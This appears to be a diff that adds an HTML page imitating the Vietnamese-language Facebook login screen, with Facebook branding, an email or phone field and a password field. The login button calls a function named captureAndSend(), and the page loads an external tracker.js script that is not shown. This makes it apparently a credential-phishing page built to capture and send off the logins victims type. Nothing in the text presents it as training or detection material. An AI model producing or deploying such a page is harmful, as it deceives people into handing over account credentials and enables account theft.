@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Đăng nhập Facebook</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fff; margin: 0; }
+        .header { background: #3b5998; color: white; padding: 10px; text-align: center; font-size: 24px; font-weight: bold; }
+        .container { padding: 20px; max-width: 400px; margin: auto; }
+        input { width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; background: #f5f6f7; }
+        .btn-login { width: 100%; padding: 12px; background: #1877f2; border: none; color: white; font-weight: bold; border-radius: 4px; font-size: 16px; }
+        .footer { text-align: center; margin-top: 20px; color: #757575; font-size: 14px; }
+    </style>
+</head>
+<body>
+    <div class="header">facebook</div>
+    <div class="container">
+        <input type="text" id="email" placeholder="Số di động hoặc email">
+        <input type="password" id="pass" placeholder="Mật khẩu">
+        <button class="btn-login" onclick="captureAndSend()">Đăng nhập</button>
+        <div class="footer">Quên mật khẩu? · Trung tâm trợ giúp</div>
+    </div>
+    <script src="tracker.js"></script>
+</body>
+</html>
